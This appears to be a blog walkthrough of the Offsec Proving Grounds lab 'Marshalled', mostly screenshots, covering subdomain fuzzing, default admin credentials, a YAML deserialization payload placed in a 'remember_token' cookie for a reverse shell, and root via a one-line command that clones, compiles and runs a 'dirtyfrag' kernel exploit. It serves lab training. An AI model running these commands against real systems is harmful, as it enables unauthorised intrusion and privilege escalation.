---
title: Marshalled
date: 2026-06-04T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - python
  - Caido
  - hosts
  - ffuf
  - gobuster
  - wfuzz
  - yaml
  - Ruby
  - Dirty-Frag
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Marshalled"
---
"The best cheater always wins"
― Eli Kennedy

![](Screenshot%202026-06-05%20at%2013.20.48.png)

![](Screenshot%202026-06-05%20at%2013.19.53.png)

`sudo vim /etc/hosts`

![](Screenshot%202026-06-05%20at%2013.28.19.png)

![](Screenshot%202026-06-05%20at%2013.27.30.png)

![](Screenshot%202026-06-05%20at%2013.29.04.png)

![](Screenshot%202026-06-05%20at%2013.29.24.png)

![](Screenshot%202026-06-05%20at%2013.40.50.png)

Lol, monitoring wasn't in my wordlist. From now on I'll use seclist/../DNS....

 `wfuzz -u http://marshalled.pg/ -H "Host: FUZZ.marshalled.pg" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 868`

![](Screenshot%202026-06-05%20at%2014.36.39.png)

`ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.marshalled.pg/`

![](Screenshot%202026-06-05%20at%2014.43.59.png)

update the /etc/hosts file:

![](Screenshot%202026-06-05%20at%2014.45.13.png)

![](Screenshot%202026-06-05%20at%2014.46.25.png)

admin:admin

![](Screenshot%202026-06-05%20at%2014.47.50.png)


![](Screenshot%202026-06-05%20at%2014.49.16.png)

When you tick the 'Remember Me' box you get this cookie. 

![](Screenshot%202026-06-06%20at%2008.30.50.png)

Url decode:

![](Screenshot%202026-06-06%20at%2008.32.12.png)

base64 decode:

![](Screenshot%202026-06-06%20at%2008.33.16.png)


https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/

The script below will is a YAML deserialization exploit payload:

![](Screenshot%202026-06-06%20at%2013.31.28.png)

Copy and change the IP and port,  then base64 and url encode:

![](Screenshot%202026-06-06%20at%2013.26.07.png)

There are 4 Request/Responses. You arrive at the site `GET /`, then you navigate to the login page `GET /login`, your login `POST /login` and the `GET /dashboard`.

Its important to use the `GET /dashboard` request for your payload. Send it to replay or repeater and swap out your payload for the `remember_token` token :) 

![](Screenshot%202026-06-06%20at%2014.07.27.png)

Start your listener:  
`rlwrap nc -lvnp 443`

![](Screenshot%202026-06-07%20at%2013.27.45.png)

![](Screenshot%202026-06-07%20at%2013.29.15.png)

![](Screenshot%202026-06-06%20at%2014.44.11.png)

Cheating:  
 `git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp`

![](Screenshot%202026-06-07%20at%2013.32.19.png)

If you want to keep going and do it properly:

![](Screenshot%202026-06-07%20at%2013.30.29.png)

![](Screenshot%202026-06-06%20at%2015.35.07.png)

To do this properly requires binary exploitation of the cname executable. 

I've tried to do it but lack the patience.